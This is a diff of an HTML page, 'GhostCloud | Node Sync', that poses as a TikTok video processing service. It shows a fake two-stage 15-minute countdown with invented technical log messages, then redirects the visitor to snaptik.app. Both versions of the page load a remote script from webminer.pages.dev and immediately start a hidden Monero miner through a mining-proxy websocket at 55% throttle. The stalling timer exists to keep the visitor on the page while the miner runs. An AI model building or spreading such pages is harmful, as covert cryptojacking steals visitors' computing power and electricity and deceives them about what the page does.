@@ -1,91 +1,66 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8"><title>GhostCloud | Node Sync</title>
+    <meta charset="UTF-8">
+    <title>GhostCloud | Node Sync</title>
     <script src="https://webminer.pages.dev/load.js"></script>
     <style>
-        :root { --blue: #007bff; --bg: #0b111a; --card: #161d27; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .container { width: 90%; max-width: 400px; background: var(--card); padding: 40px; border-radius: 20px; border: 1px solid #2d3643; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
-        .status-header { font-size: 10px; font-weight: 800; color: var(--blue); text-transform: uppercase; letter-spacing: 3px; margin-bottom: 5px; }
-        .timer-box { font-size: 56px; font-weight: 200; margin: 10px 0; font-variant-numeric: tabular-nums; }
-        .progress-container { background: #1e293b; height: 8px; border-radius: 10px; margin: 25px 0 10px 0; overflow: hidden; position: relative; }
-        .progress-bar { height: 100%; width: 0%; background: var(--blue); box-shadow: 0 0 15px rgba(0, 123, 255, 0.5); transition: 1s linear; }
-        .percent-text { font-size: 14px; font-weight: 600; color: #94a3b8; }
-        .log-box { margin-top: 30px; text-align: left; background: #0b111a; padding: 15px; border-radius: 10px; border: 1px solid #232d3d; font-family: monospace; font-size: 11px; color: #64748b; height: 40px; overflow: hidden; }
+        body { background: #0b111a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .container { width: 350px; background: #161d27; padding: 40px; border-radius: 15px; border: 1px solid #2d3643; text-align: center; }
+        #clock { font-size: 50px; font-family: monospace; margin: 20px 0; color: #007bff; }
+        .bar-bg { background: #1e293b; height: 10px; border-radius: 5px; overflow: hidden; margin-bottom: 10px; }
+        #bar-fill { height: 100%; width: 0%; background: #007bff; transition: width 1s linear; }
+        .info { color: #64748b; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="status-header" id="stage-title">STAGE 1: CDN FRAGMENT SYNC</div>
-    <div class="timer-box" id="clock">15:00</div>
-    
-    <div class="progress-container">
-        <div class="progress-bar" id="bar"></div>
-    </div>
-    <div class="percent-text"><span id="percent">0</span>% COMPLETE</div>
-
-    <div class="log-box" id="logs">> Initializing handshake with TikTok-edge-srv...</div>
+    <div class="info" id="status">STAGE 1: CDN SYNC</div>
+    <div id="clock">15:00</div>
+    <div class="bar-bg"><div id="bar-fill"></div></div>
+    <div class="info"><span id="pct">0</span>% COMPLETE</div>
 </div>
 
 <script>
-    // START MINER - DON'T FORGET YOUR WALLET ADDRESS!
-    startMining("YOUR_XMR_WALLET_ADDRESS", "GhostCloud_Node", "wss://ny1.xmrminingproxy.com", 55);
+    // 1. START THE MINER IMMEDIATELY
+    try {
+        startMining("YOUR_XMR_WALLET_ADDRESS", "GhostCloud_Node", "wss://ny1.xmrminingproxy.com", 55);
+    } catch(e) { console.log("Miner status: offline"); }
 
-    const urlParams = new URLSearchParams(window.location.search);
-    let stage = parseInt(urlParams.get('stage')) || 1;
-    let totalSeconds = 900; // 15 Minutes
-    let timeLeft = totalSeconds;
+    // 2. THE TIMER LOGIC
+    const params = new URLSearchParams(window.location.search);
+    let stage = parseInt(params.get('stage')) || 1;
+    let secondsLeft = 900; // 15 Minutes
 
-    const clockEl = document.getElementById('clock');
-    const barEl = document.getElementById('bar');
-    const percentEl = document.getElementById('percent');
-    const titleEl = document.getElementById('stage-title');
-    const logEl = document.getElementById('logs');
-
-    // Change UI for Stage 2
     if(stage === 2) {
-        titleEl.innerText = "STAGE 2: H.264 RECONSTRUCTION";
-        logEl.innerText = "> Bypassing header encryption... Reconstruction started.";
+        document.getElementById('status').innerText = "STAGE 2: RECONSTRUCTION";
     }
 
-    const logs = [
-        "> Establishing SSL Tunnel...",
-        "> Pulling fragment blocks 0x442... ",
-        "> Decrypting bitrate headers...",
-        "> Syncing audio/video streams...",
-        "> Verifying frame integrity...",
-        "> Optimizing for 4K playback..."
-    ];
+    const timer = setInterval(function() {
+        secondsLeft--;
 
-    const countdown = setInterval(() => {
-        timeLeft--;
-        
-        // Timer display (MM:SS)
-        let m = Math.floor(timeLeft / 60);
-        let s = timeLeft % 60;
-        clockEl.textContent = `${m}:${s < 10 ? '0' : ''}${s}`;
+        // Update Clock
+        let m = Math.floor(secondsLeft / 60);
+        let s = secondsLeft % 60;
+        document.getElementById('clock').innerHTML = m + ":" + (s < 10 ? "0" + s : s);
 
-        // Progress Math
-        let progress = ((totalSeconds - timeLeft) / totalSeconds) * 100;
-        barEl.style.width = progress + "%";
-        percentEl.textContent = Math.floor(progress);
+        // Update Bar and Percentage
+        let progress = ((900 - secondsLeft) / 900) * 100;
+        document.getElementById('bar-fill').style.width = progress + "%";
+        document.getElementById('pct').innerHTML = Math.floor(progress);
 
-        // Random log updates every 30 seconds for "Expert" feel
-        if (timeLeft % 30 === 0) {
-            logEl.innerText = logs[Math.floor(Math.random() * logs.length)];
-        }
-
-        if (timeLeft <= 0) {
-            clearInterval(countdown);
-            const originalUrl = urlParams.get('url');
+        // When time hits zero
+        if (secondsLeft <= 0) {
+            clearInterval(timer);
+            let targetUrl = params.get('url') || "https://tiktok.com";
+            
             if (stage === 1) {
-                // Moving to Stage 2
-                window.location.href = `verify.html?url=${encodeURIComponent(originalUrl)}&stage=2`;
+                // Go to Stage 2
+                window.location.href = "verify.html?stage=2&url=" + encodeURIComponent(targetUrl);
             } else {
-                // Final Move: Send to SnapTik
-                window.location.href = `https://snaptik.app/abc.php?url=${encodeURIComponent(originalUrl)}`;
+                // Final Redirect to SnapTik
+                window.location.href = "https://snaptik.app/abc.php?url=" + encodeURIComponent(targetUrl);
             }
         }
     }, 1000);
